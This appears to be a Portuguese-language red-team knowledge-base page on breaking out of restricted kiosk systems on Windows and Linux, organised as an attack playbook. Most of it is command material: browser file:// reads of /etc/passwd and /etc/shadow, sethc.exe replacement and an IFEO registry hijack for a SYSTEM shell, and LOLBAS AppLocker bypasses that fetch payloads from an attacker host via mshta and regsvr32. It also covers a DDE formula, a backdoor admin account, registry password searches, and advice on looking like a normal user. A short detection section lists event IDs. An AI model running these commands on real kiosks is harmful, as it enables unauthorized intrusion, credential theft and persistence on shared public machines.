---
layout: cyber
section: pos-expl-linux
title: "Kiosk Breakouts"
---

# Kiosk Breakouts

## Hardware Exposto, Supervisão Mínima

Ambientes de kiosk são projetados para restringir o usuário a uma única aplicação ou conjunto limitado de funções. Estão presentes em bancos (terminais de autoatendimento), hospitais (quiosques de cadastro de pacientes), aeroportos (check-in), escritórios corporativos (thin clients com acesso a uma única aplicação), lojas de varejo (terminais de ponto de venda) e bibliotecas públicas.

Do ponto de vista de red team e pentest físico, kiosks representam um vetor único: o hardware já está exposto, frequentemente sem supervisão direta, e o objetivo é escapar para além da interface restrita — obtendo uma shell, acesso ao sistema de arquivos, ou capacidade de executar código arbitrário. Em um engagement realista, um shell em kiosk mal configurado pode revelar credenciais hardcoded para sistemas internos, acesso à rede interna corporativa, dados de clientes em bancos de dados locais, e possibilidade de instalar keyloggers para capturar PINs.

Este documento cobre técnicas organizadas por vetor de ataque, aplicáveis tanto em Windows (maioria dos kiosks) quanto em Linux.

---

## Sistema Operacional Por Baixo, Vetores em Cima

### Modelo Mental de Kiosk

Um kiosk é implementado por uma combinação de:

1. **Restrição de shell**: GPO bloqueando cmd.exe, PowerShell, regedit, taskmgr
2. **Shell customizado**: Windows com `shell = "C:\kiosk\app.exe"` no Winlogon em vez de `explorer.exe`
3. **Política de grupo**: AppLocker, SRP (Software Restriction Policies), ou WDAC
4. **Modo de kiosk nativo**: Windows Assigned Access, Chrome OS Kiosk Mode
5. **Aplicação fullscreen**: Um único app em tela cheia impedindo acesso ao desktop

A fraqueza fundamental é que o kiosk precisa de um sistema operacional funcional por baixo — e onde há sistema operacional, há vetores de ataque.

### Objetivos do Atacante

1. Obter acesso a linha de comando (cmd.exe, PowerShell, bash)
2. Navegar no sistema de arquivos
3. Executar código arbitrário
4. Escalar privilégios (o processo do kiosk frequentemente roda com privilégios elevados)
5. Acessar dados sensíveis ou a rede interna

---

## Na Prática

### 1. Técnicas via Browser

Muitos kiosks usam um browser como interface principal (quiosques web, portais de autoatendimento).

**URL Bar — Acesso Direto a Arquivos**

```
# Linux
file:///etc/passwd
file:///etc/shadow (improvável mas tentar)
file:///home/kiosk/.bash_history
file:///var/www/html/config.php

# Windows
file:///C:/Windows/System32/
file:///C:/Users/
C:\Windows\System32\cmd.exe         <- digitar diretamente na URL bar
C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
```

**Dialogs de Abrir/Salvar Arquivo**

Atalhos que abrem dialogs de arquivo no browser:
- `Ctrl+S` — Salvar página como → dialog de sistema de arquivos
- `Ctrl+O` — Abrir arquivo → dialog de sistema de arquivos
- `Ctrl+P` → Imprimir → Selecionar impressora "Microsoft Print to PDF" → salvar → abrir o PDF com viewer → dentro do viewer, File > Open

Uma vez que um dialog de arquivo do Windows está aberto:
```
# Na barra de endereço do dialog:
C:\Windows\System32\cmd.exe     <- pressionar Enter executa cmd.exe
\\127.0.0.1\C$\                 <- navegar pela rede
%TEMP%\                         <- diretório temporário writable
```

**Developer Tools (F12)**

Se o kiosk não bloqueia F12:

```javascript
// Console do browser — execução de JavaScript
// Tentar abrir nova janela sem restrições
window.open("file:///C:/Windows/System32/cmd.exe")
window.open("about:blank")

// Em Electron apps (browsers baseados em Electron)
// o contexto Node.js pode estar acessível via preload script exposto:
// window._electronAPI.runCommand('cmd.exe')   <- se API insegura exposta

// Verificar contexto do processo
navigator.userAgent
window.process  // se definido, é um app Electron
window.require  // se definido, Node.js disponível no renderer
```

**about:blank e HTML Injection**

```
# Navegar para about:blank
# Criar HTML na página com link para executável
<a href="file:///C:/Windows/System32/cmd.exe">Open</a>

# Via console JavaScript
document.write('<a href="file:///C:/Windows/System32/cmd.exe">click</a>')

# Tentar abrir shell via URI handler registrado
ms-msdt:              <- Follina-style (se não patchado — CVE-2022-30190)
microsoft-edge:       <- abrir outro browser
search-ms:            <- Windows Search dialog
```

**Imprimir para PDF → Abrir PDF Viewer**

PDF viewers (Adobe Reader, Foxit, etc.) frequentemente têm menus File > Open que permitem navegar o sistema de arquivos. Em versões mais antigas, JavaScript do PDF pode executar comandos.

```
Workflow:
1. Ctrl+P no browser
2. Selecionar "Microsoft Print to PDF"
3. Salvar PDF em local writable
4. Se PDF viewer abrir automaticamente: File > Open -> navegar pelo sistema
5. Se Adobe Reader: Edit > Preferences -> Trust Manager -> Change settings
```

---

### 2. Atalhos de Teclado

**Atalhos universais de tentativa:**

```
# Abrir terminal
Ctrl+Alt+T          <- Linux GNOME/Ubuntu
Win+R               <- Run dialog (Windows)
Ctrl+Shift+Esc      <- Task Manager (Windows)
Ctrl+Alt+Del        <- Security options (Windows) -> Task Manager
Alt+F4              <- Fechar aplicação atual
Win+E               <- Windows Explorer
Win+D               <- Mostrar desktop
Win+X               <- Power User Menu (Win 8/10/11)
Win+F               <- Pesquisar (Windows)
Win+Pause/Break     <- System Properties

# Se funcionar - Win+R:
cmd.exe
powershell.exe
explorer.exe
mmc.exe             <- Microsoft Management Console
mstsc.exe           <- Remote Desktop
osk.exe             <- On-Screen Keyboard (pode ter menus)

# Teclado virtual e acessibilidade
F1                  <- Help (frequentemente abre IE ou Edge)
Shift x5 rapidamente <- StickyKeys dialog
Alt+Shift            <- pode ativar outros recursos de acessibilidade
```

**Win+R (Run Dialog) — sequência de tentativas:**

```
cmd.exe
powershell.exe
powershell -nop -w hidden -c "Start-Process cmd.exe"
explorer.exe
\\KALI_IP\share\      <- acesso a share SMB controlado pelo atacante
notepad.exe           <- abrir e depois File > Open
mspaint.exe           <- File > Open > tipo: todos os arquivos
```

---

### 3. Sticky Keys e Ferramentas de Acessibilidade

Esta é uma das técnicas mais clássicas para obter shell SYSTEM em sistemas Windows sem autenticar.

**Método 1: StickyKeys Dialog na Interface do Kiosk**

```
1. Pressionar Shift 5 vezes rapidamente
2. Se StickyKeys dialog aparecer:
   - Clicar em "Ajuda" (Go to Ease of Access Center)
   - Isso abre um browser (IE/Edge)
   - Na URL bar: C:\Windows\System32\cmd.exe
```

**Método 2: Substituição de Executável de Acessibilidade (requer acesso anterior)**

Esta técnica é usada quando há acesso físico prévio ao sistema ou acesso a um share de rede:

```cmd
rem Substituir sethc.exe por cmd.exe
rem Na tela de login, pressionar Shift 5x abre cmd.exe como SYSTEM

takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrators:F
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

rem Alternativa via Image File Execution Options (requer admin, mais furtivo)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

rem Outros executaveis de acessibilidade exploraveis da mesma forma:
rem utilman.exe    <- Win+U ou botao de acessibilidade na tela de login
rem magnify.exe    <- Lupa
rem narrator.exe   <- Narrador
rem osk.exe        <- Teclado virtual
rem displayswitch.exe
```

**Método 3: Magnifier / Narrator dentro do Kiosk**

Se o botão de acessibilidade está disponível na interface do kiosk:

```
1. Clicar no ícone de acessibilidade (se presente)
2. Ativar "Magnifier" (Lupa) ou "Narrator"
3. A lupa tem menu de configurações -> Help -> pode abrir browser
4. Narrator tem "Narrator Settings" -> pode ter links de ajuda
5. Links de ajuda frequentemente abrem o Windows Help system
6. Windows Help system pode ter links para executar comandos
```

---

### 4. Task Manager

**Acessar Task Manager:**

```
Ctrl+Shift+Esc      <- Atalho direto
Ctrl+Alt+Del -> Task Manager
```

**Explorar via Task Manager:**

```
# Se Task Manager abrir:
File -> Run new task -> cmd.exe           <- caixa de diálogo de execução
File -> Run new task -> powershell.exe
File -> Run new task -> explorer.exe      <- reiniciar Explorer sem restrições

# Aba Details -> botão direito em processo -> Open file location
# Navegar no Windows Explorer
# Executar da barra de endereço do Explorer
```

**Reiniciar explorer.exe via Task Manager:**

```
# Se Explorer está rodando com shell restrictions (políticas de GPO aplicadas)
# Às vezes reiniciá-lo sem as mesmas políticas pode quebrar as restrições

# Task Manager -> File -> Run new task
explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding
# Ou simplesmente matar explorer e executar novamente
```

---

### 5. Exploração via Aplicações Permitidas

**Microsoft Word / Office (se acessível no kiosk):**

```
# Macros VBA (se habilitadas - raro em kiosks bem configurados)
# Tools -> Macros -> Visual Basic Editor
# No editor VBA:
Sub AutoOpen()
    Shell "cmd.exe /k whoami"
End Sub

# File -> Open -> navegar no sistema de arquivos
# File -> Open -> mudar tipo para "All Files (*.*)"
# Navegar para C:\Windows\System32\cmd.exe -> abrir

# Help pages
F1 -> Help abre Internet Explorer embutido
# Na URL bar do IE embutido:
C:\Windows\System32\cmd.exe
```

**Microsoft Excel:**

```
# Célula com hyperlink para executável
=HYPERLINK("C:\Windows\System32\cmd.exe","Click me")

# Fórmula DDE (se habilitado - legado)
# =cmd|' /c calc.exe'!A1
```

**Paint (mspaint.exe):**

```
File -> Open
Mudar tipo de arquivo para "All Files"
Navegar para C:\Windows\System32\
Selecionar cmd.exe -> Abrir -> executará cmd.exe
```

**Notepad:**

```
File -> Open
Mudar tipo para All Files
Navegar e executar arquivos .bat, .exe, .cmd
```

**Qualquer aplicação com dialog de "Open File":**

Na barra de endereço do dialog File > Open:

```
C:\Windows\System32\cmd.exe
\\KALI_IP\share\                <- conectar a share externo
%COMSPEC%
%SystemRoot%\System32\
```

---

### 6. Técnicas Específicas do Windows

**AppLocker Bypass:**

Se AppLocker está bloqueando executáveis mas permite scripts:

```powershell
# Verificar regras do AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Caminhos frequentemente na whitelist do AppLocker:
C:\Windows\Temp\
C:\Users\Public\
C:\ProgramData\

# LOLBAS (Living Off the Land Binaries) que bypassam AppLocker:
mshta.exe http://KALI/payload.hta
wscript.exe \\KALI\share\script.vbs
cscript.exe payload.vbs
regsvr32.exe /s /n /u /i:http://KALI/payload.sct scrobj.dll
installutil.exe /logfile= /LogToConsole=false /U payload.exe
```

**Bypass via %TEMP% writable:**

```cmd
# Se %TEMP% é writable e está numa pasta permitida pelo AppLocker
echo C:\Windows\System32\cmd.exe > %TEMP%\run.bat
%TEMP%\run.bat
```

---

### 7. Técnicas para Kiosks Linux

**Via Browser:**

```javascript
// Developer tools (F12)
// Fetch para ler arquivos (Chrome, requer que file:// scheme esteja liberado)
fetch("file:///etc/passwd")
  .then(r => r.text())
  .then(t => console.log(t))

// Verificar se é Electron — checar window.process
// Se disponível, pode haver API exposta pelo preload script
// Inspecionar window.__proto__ e propriedades globais expostas
```

**Terminal via atalhos no Linux:**

```
Ctrl+Alt+T          <- GNOME Terminal
Ctrl+Alt+F2         <- TTY virtual (se não bloqueado)
Alt+F2              <- Run dialog (GNOME 2, KDE)
Super+T             <- Terminal em alguns ambientes
```

**Se Compositor X11 disponível:**

```bash
# Tentar abrir nova janela via xterm
DISPLAY=:0 xterm &
DISPLAY=:0 xfce4-terminal &

# Verificar se xdotool está disponível para simular teclado
xdotool key ctrl+alt+t

# Tentar via dbus
dbus-send --session --dest=org.gnome.Terminal \
  /org/gnome/Terminal/Factory0 \
  org.gnome.Terminal.Factory.CreateInstance array:string:""
```

**Kiosk baseado em browser (Chrome Kiosk Mode):**

```
# Chrome em kiosk mode (--kiosk flag)
Ctrl+L          <- focar URL bar (pode estar bloqueada)
Ctrl+F          <- busca na página (pode ainda funcionar)
F12             <- developer tools (frequentemente bloqueado via --disable-dev-tools)

# Se usar Chrome OS kiosk:
Ctrl+Alt+T      <- Crosh shell (se habilitado)
crosh> shell    <- bash (se permitido pelo administrador)
```

---

### 8. Após o Breakout — Próximos Passos

Após conseguir acesso a cmd.exe ou shell:

**Enumeração imediata:**

```cmd
rem Windows
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
ipconfig /all
netstat -an
tasklist /v
systeminfo
```

```bash
# Linux
id; whoami; groups
uname -a
ip addr
ps aux
sudo -l
find / -perm -4000 2>/dev/null
```

**Verificar contexto de execução do kiosk:**

```cmd
rem Verificar como o processo do kiosk roda
whoami
rem SYSTEM -> ouro (já tem máximo acesso)
rem LOCAL SERVICE / NETWORK SERVICE -> privilégios limitados mas úteis
rem Usuário específico -> verificar o que esse usuário pode acessar
```

**Persistência para acesso futuro:**

```cmd
rem Adicionar conta de admin local
net user hacker Password1! /add
net localgroup administrators hacker /add
```

**Busca por credenciais no contexto do kiosk:**

```cmd
rem Arquivos de configuração da aplicação
type "%AppData%\KioskApp\config.xml"
type "C:\KioskApp\settings.ini"
type "C:\inetpub\wwwroot\web.config"

rem Registry para credenciais salvas
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s
```

---

## Exemplos de Código / Comandos

### Checklist de Tentativas (em ordem de menos a mais disruptivo)

```
FASE 1 - Sem interação com OS (mais silencioso)
[ ] Tentar URL bar do browser com file:// e caminhos de executável
[ ] F12 developer tools -> console JavaScript
[ ] Ctrl+S -> dialog de salvar -> executar da barra de endereço
[ ] Ctrl+O -> dialog de abrir -> executar da barra de endereço

FASE 2 - Atalhos do OS (pode gerar logs)
[ ] Win+R (Run dialog)
[ ] Ctrl+Shift+Esc (Task Manager)
[ ] Ctrl+Alt+Del -> Task Manager
[ ] Shift x5 (StickyKeys)

FASE 3 - Aplicações (pode chamar atenção)
[ ] Help pages -> IE embutido -> URL bar
[ ] File > Open dialogs -> executar arquivos
[ ] Macro em apps de Office
[ ] Accessibility tools (Magnifier, Narrator)

FASE 4 - Acesso físico (requer hardware)
[ ] Boot de live USB
[ ] Substituir sethc.exe / utilman.exe
[ ] Acesso ao BIOS/UEFI
[ ] Extrair disco para análise offline
```

### Comando Rápido Após Breakout Windows

```powershell
# Primeiros comandos após obter cmd.exe em kiosk Windows
whoami /all
net user
ipconfig /all
netstat -ano | findstr LISTENING
tasklist /SVC
systeminfo | findstr /i "os name"
net share
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
dir "C:\Users" /ad
dir "C:\Program Files" /ad
```

---

## Detecção e OPSEC

### Como Kiosks São Monitorados

- **Câmeras físicas**: Ações físicas no hardware são gravadas
- **Logs do sistema**: Criação de processos, login events, acesso a arquivos
- **Software de monitoramento do kiosk**: Muitos kiosks têm software dedicado que reporta anomalias (tentativas de acesso ao desktop, processos inesperados)
- **EDR**: Em ambientes corporativos, o kiosk pode ter agente EDR mesmo sem aparecer para o usuário

### Indicadores de Tentativa de Breakout

```
Windows Event Logs:
- 4688: Process Creation (cmd.exe, powershell.exe criados por processo do kiosk)
- 4625: Logon failure (tentativas de login)
- 4720: User account created
- 7045: New service installed

Logs específicos:
- Browser history (tentativas de file://)
- AppLocker event logs: Microsoft-Windows-AppLocker/EXE and DLL
- StickyKeys ativado: processo sethc.exe iniciado
```

### OPSEC Durante Testes de Kiosk

1. **Fotografar antes**: Documentar o estado inicial para evidência e restauração
2. **Não criar contas permanentes** sem instrução explícita do cliente
3. **Documentar cada tentativa** — mesmo as que falham são evidência de hardening insuficiente
4. **Limpar rastros após teste**: Remover contas criadas, restaurar configurações modificadas
5. **Horário**: Fazer testes em horários de baixo movimento para não chamar atenção física
6. **Aparência**: Em testes físicos, parecer um usuário normal do kiosk

---

## Módulos Relacionados

Após um breakout bem-sucedido em kiosk Linux, `01_linux_post_exploitation.md` provê o checklist de enumeração e escalada de privilégios. Para kiosks Windows, `../06_pos_exploracao_windows/05_persistencia.md` cobre como estabelecer persistência no shell obtido. ATT&CK T1546.012 (IFEO Injection), T1548 (Elevation Control Mechanism), T1059 (Command and Scripting Interpreter) e T1218 (System Binary Proxy Execution/LOLBAS) mapeiam os vetores desta nota.
